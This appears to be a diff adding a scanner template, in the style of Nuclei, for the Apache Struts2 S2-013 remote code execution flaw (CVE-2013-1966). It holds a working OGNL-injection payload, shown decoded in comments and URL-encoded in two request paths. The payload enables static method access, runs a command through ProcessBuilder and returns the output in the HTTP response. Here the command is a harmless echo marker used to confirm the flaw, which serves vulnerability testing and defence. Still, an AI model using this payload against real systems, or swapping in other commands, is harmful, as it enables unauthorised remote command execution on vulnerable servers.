@@ -1,0 +1,39 @@
+id: local-struts2-s2-013-cmd-rce
+
+info:
+  name: Struts2 S2-013 Command Execution via includeParams OGNL (CVE-2013-1966)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-013 RCE via OGNL injection through URL tag includeParams=all.
+    GET parameter value is parsed as OGNL by the <s:a> tag. Payload unlocks static
+    method access, executes echo via ProcessBuilder, and returns output via
+    HttpServletResponse.getWriter(). Targets /link.action as found in vulhub demo app.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-013
+    - https://nvd.nist.gov/vuln/detail/CVE-2013-1966
+  tags: safe-poc,exploit,struts2,s2-013,cve,cve2013,rce,ognl
+
+http:
+  - method: GET
+    path:
+      # Decoded payload parameter a:
+      # ${(#_memberAccess["allowStaticMethodAccess"]=true,
+      #   #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"echo","pentest-platform-s2013-rce"}))
+      #       .redirectErrorStream(true).start(),
+      #   #b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),
+      #   #d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),
+      #   #out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),
+      #   #out.println(new java.lang.String(#e)),#out.close())}
+      - "{{BaseURL}}/link.action?a=%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22echo%22%2C%22pentest-platform-s2013-rce%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28new+java.lang.String%28%23e%29%29%2C%23out.close%28%29%29%7D"
+      - "{{BaseURL}}/S2-013/link.action?a=%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22echo%22%2C%22pentest-platform-s2013-rce%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28new+java.lang.String%28%23e%29%29%2C%23out.close%28%29%29%7D"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pentest-platform-s2013-rce"
+      - type: status
+        status:
+          - 200
